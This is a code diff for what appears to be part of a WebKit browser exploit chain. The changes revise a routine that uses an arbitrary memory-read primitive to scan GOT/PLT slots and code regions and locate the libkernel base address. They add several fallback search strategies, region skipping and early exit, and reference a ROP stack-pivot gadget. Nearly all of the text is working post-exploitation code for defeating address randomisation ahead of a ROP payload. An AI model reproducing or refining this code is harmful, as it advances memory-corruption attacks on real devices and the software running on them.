@@ -102,12 +102,63 @@ export function saveLibkernelSession(lk, iatRva) {
     } catch (_) { }
 }
 
+function lkFromGotPtr(p, fnPtr, off, iatRva) {
+    if (!fnPtr || fnPtr.hi < 0x8) return null;
+
+    if (off.k__error != null) {
+        const lk = fnPtr.sub32(off.k__error);
+        if (isLibkernelPrologue(p, lk))
+            return { lk, iatRva, errorFn: fnPtr, via: "error" };
+    }
+
+    if (off.k_stubs && off.k_stubs[20] != null && isGetpidStub(fnPtr)) {
+        const lk = fnPtr.sub32(off.k_stubs[20]);
+        if (isLibkernelPrologue(p, lk))
+            return { lk, iatRva, errorFn: fnPtr, via: "getpid-got" };
+    }
+
+    const pageLo = (fnPtr.low >>> 0) & ~0x3fff;
+    const base = new int64(pageLo, fnPtr.hi >>> 0);
+    if (isLibkernelPrologue(p, base))
+        return { lk: base, iatRva, errorFn: fnPtr, via: "page" };
+
+    for (let back = 0x4000; back <= 0x200000; back += 0x4000) {
+        const tryBase = fnPtr.sub32(back);
+        if (isLibkernelPrologue(p, tryBase))
+            return { lk: tryBase, iatRva, errorFn: fnPtr, via: "walk" };
+    }
+    return null;
+}
+
 function lkFromIatSlot(p, webkitBase, rva, off, read8) {
-    const errorFn = read8(p, webkitBase.add32(rva));
-    if (!errorFn || (errorFn.hi === 0 && errorFn.low < 0x100000)) return null;
-    const lk = errorFn.sub32(off.k__error);
-    if (!isLibkernelPrologue(p, lk)) return null;
-    return { lk, iatRva: rva, errorFn };
+    const fnPtr = read8(p, webkitBase.add32(rva));
+    if (!fnPtr || (fnPtr.hi === 0 && fnPtr.low < 0x100000)) return null;
+    const hit = lkFromGotPtr(p, fnPtr, off, rva);
+    if (!hit) return null;
+    return { lk: hit.lk, iatRva: hit.iatRva, errorFn: hit.errorFn, via: hit.via };
+}
+
+/** Code scan regions — skip 0x600000–0x1200000 middle (slow, rarely GOT xrefs). */
+function iatCodeRegions(off) {
+    const cap = webkitRvaMax(off);
+    const g5 = off.wk_PUSH_RDX_POP_RSP_RET || 0x13ec77a;
+    const highLo = Math.max(0x1180000, g5 - 0x300000);
+    const highHi = Math.min(cap, g5 + 0x300000);
+    const regions = [
+        { lo: 0x10000, hi: Math.min(0x600000, cap), tag: "low" },
+        { lo: highLo, hi: highHi, tag: "high" },
+    ];
+    if (0x600000 < highLo)
+        regions.push({ lo: 0x600000, hi: Math.min(highLo, cap), tag: "mid" });
+    return regions.filter(r => r.lo < r.hi);
+}
+
+function iatBeginCodePhase(state, off) {
+    state.regions = iatCodeRegions(off);
+    state.regionIdx = 0;
+    state.cursor = state.regions[0].lo;
+    state.maxRva = state.regions[0].hi;
+    state.regionTag = state.regions[0].tag;
 }
 
 /** Parse ELF64 PT_DYNAMIC for DT_PLTGOT (few reads). */
@@ -223,6 +274,7 @@ export function scanErrorIatChunk(p, webkitBase, off, state) {
             return { done: false, state, phase: "elf-hit", gotPlt: gotRva };
         }
         state.phase = "code";
+        iatBeginCodePhase(state, off);
         return { done: false, state, phase: "elf-miss" };
     }
 
@@ -252,6 +304,7 @@ export function scanErrorIatChunk(p, webkitBase, off, state) {
         if (state.gotSlot >= maxSlots
             || !iatRvaAllowed(state.gotPlt + state.gotSlot * 8, off)) {
             state.phase = "code";
+            iatBeginCodePhase(state, off);
             return { done: false, state, phase: "gotplt-miss" };
         }
         return {
@@ -276,10 +329,47 @@ export function scanErrorIatChunk(p, webkitBase, off, state) {
             steps++;
         }
         if (state.cursor >= state.maxRva) {
+            const nextIdx = (state.regionIdx || 0) + 1;
+            const skipMid = state.gotQueue.length >= 48
+                && state.regionTag === "low"
+                && state.regions
+                && nextIdx < state.regions.length
+                && state.regions[nextIdx].tag === "mid";
+            const jumpIdx = skipMid ? nextIdx + 1 : nextIdx;
+            if (state.regions && jumpIdx < state.regions.length) {
+                state.regionIdx = jumpIdx;
+                state.cursor = state.regions[jumpIdx].lo;
+                state.maxRva = state.regions[jumpIdx].hi;
+                state.regionTag = state.regions[jumpIdx].tag;
+                const skipped = skipMid ? " (skip mid — q=" + state.gotQueue.length + ")" : "";
+                return {
+                    done: false,
+                    state,
+                    phase: "code-region",
+                    region: state.regionTag,
+                    cursor: state.cursor,
+                    queued: state.gotQueue.length,
+                    note: skipped,
+                };
+            }
             state.phase = "verify";
             state.gotIdx = 0;
+            return {
+                done: false,
+                state,
+                phase: "code-done",
+                queued: state.gotQueue.length,
+            };
         }
-        return { done: false, state, phase: "code", cursor: state.cursor, queued: state.gotQueue.length };
+        return {
+            done: false,
+            state,
+            phase: "code",
+            cursor: state.cursor,
+            queued: state.gotQueue.length,
+            region: state.regionTag || "code",
+            end: state.maxRva,
+        };
     }
 
     if (state.phase === "verify") {
@@ -287,8 +377,18 @@ export function scanErrorIatChunk(p, webkitBase, off, state) {
         while (state.gotIdx < state.gotQueue.length && checks < 48) {
             const rva = state.gotQueue[state.gotIdx++];
             const hit = lkFromIatSlot(p, webkitBase, rva, off, read8p);
-            if (hit && (!state.best || rva < state.best.iatRva))
+            if (hit) {
+                saveLibkernelSession(hit.lk, hit.iatRva);
+                state.done = true;
                 state.best = hit;
+                return {
+                    done: true,
+                    lk: hit.lk,
+                    iatRva: hit.iatRva,
+                    source: "plt-xref" + (hit.via ? "/" + hit.via : ""),
+                    state,
+                };
+            }
             checks++;
         }
         if (state.gotIdx >= state.gotQueue.length) {
@@ -299,9 +399,21 @@ export function scanErrorIatChunk(p, webkitBase, off, state) {
                     done: true,
                     lk: state.best.lk,
                     iatRva: state.best.iatRva,
-                    source: "plt-xref",
+                    source: "plt-xref" + (state.best.via ? "/" + state.best.via : ""),
                     state,
                 };
+            }
+            if (state.regions && !state.midRetried) {
+                const mid = state.regions.find(r => r.tag === "mid");
+                if (mid && state.gotQueue.length < 48) {
+                    state.midRetried = true;
+                    state.phase = "code";
+                    state.regionIdx = state.regions.indexOf(mid);
+                    state.cursor = mid.lo;
+                    state.maxRva = mid.hi;
+                    state.regionTag = "mid";
+                    return { done: false, state, phase: "code-retry-mid", queued: 0 };
+                }
             }
             return { done: true, state, lk: null };
         }
